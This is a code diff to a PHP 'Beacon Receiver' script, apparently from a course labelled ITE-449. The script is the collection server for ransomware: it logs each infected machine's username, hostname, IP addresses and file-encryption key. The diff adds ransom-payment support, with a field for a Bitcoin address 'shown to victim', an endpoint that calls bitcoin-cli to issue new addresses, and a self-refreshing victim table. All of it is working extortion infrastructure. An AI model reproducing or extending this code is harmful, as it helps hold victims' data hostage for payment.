@@ -8,6 +8,7 @@
  *   - internal_ip
  *   - external_ip
  *   - key (Fernet encryption key, base64)
+ *   - bitcoin_address (optional; payment address shown to victim)
  *
  * Logs each beacon to beacon_log.txt (append) and returns JSON success/error.
  * When visited via browser (GET), shows a simple human-friendly view
@@ -15,6 +16,29 @@
  */
 
 $log_file = __DIR__ . '/beacon_log.txt';
+$bitcoin_conf = __DIR__ . '/bitcoin.conf';
+$bitcoin_cli = (is_file(__DIR__ . '/bitcoin-cli') && is_executable(__DIR__ . '/bitcoin-cli'))
+    ? escapeshellarg(__DIR__ . '/bitcoin-cli')
+    : 'bitcoin-cli';
+
+// GET ?action=new_address: return a new Bitcoin address from bitcoind (JSON).
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'new_address') {
+    header('Content-Type: application/json');
+    if (!is_file($bitcoin_conf)) {
+        echo json_encode(['ok' => false, 'error' => 'bitcoin.conf not found']);
+        exit;
+    }
+    $conf_escaped = escapeshellarg($bitcoin_conf);
+    $cmd = "$bitcoin_cli -conf=$conf_escaped getnewaddress 2>&1";
+    $output = @shell_exec($cmd);
+    $address = $output ? trim($output) : '';
+    if ($address === '' || strpos($address, 'error') !== false) {
+        echo json_encode(['ok' => false, 'error' => $address ?: 'bitcoind not ready or bitcoin-cli failed']);
+        exit;
+    }
+    echo json_encode(['ok' => true, 'address' => $address]);
+    exit;
+}
 
 // Human-friendly view for GET requests.
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
@@ -40,6 +64,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     <html lang="en">
     <head>
         <meta charset="utf-8">
+        <meta http-equiv="refresh" content="1">
         <title>Beacon Receiver - ITE-449</title>
         <style>
             body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background:#0b0b10; color:#f5f5f5; margin:0; padding:2rem; }
@@ -67,6 +92,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                     <th>Computer</th>
                     <th>Internal IP</th>
                     <th>External IP</th>
+                    <th>Bitcoin address</th>
                     <th>Key</th>
                 </tr>
                 </thead>
@@ -79,6 +105,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                         <td><?php echo htmlspecialchars((string)($e['computer_name'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                         <td><?php echo htmlspecialchars((string)($e['internal_ip'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                         <td><?php echo htmlspecialchars((string)($e['external_ip'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
+                        <td class="mono"><?php echo htmlspecialchars((string)($e['bitcoin_address'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                         <td class="mono"><?php echo htmlspecialchars((string)($e['key'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                     </tr>
                 <?php endforeach; ?>
@@ -105,6 +132,7 @@ $computer_name  = isset($_POST['computer_name'])  ? trim((string) $_POST['comput
 $internal_ip    = isset($_POST['internal_ip'])     ? trim((string) $_POST['internal_ip'])     : '';
 $external_ip    = isset($_POST['external_ip'])     ? trim((string) $_POST['external_ip'])     : '';
 $key            = isset($_POST['key'])            ? trim((string) $_POST['key'])            : '';
+$bitcoin_address = isset($_POST['bitcoin_address']) ? trim((string) $_POST['bitcoin_address']) : '';
 
 $missing = [];
 if ($username === '')      $missing[] = 'username';
@@ -126,6 +154,7 @@ $entry = [
     'internal_ip'     => $internal_ip,
     'external_ip'     => $external_ip,
     'key'             => $key,
+    'bitcoin_address' => $bitcoin_address,
 ];
 
 $line = json_encode($entry) . "\n";
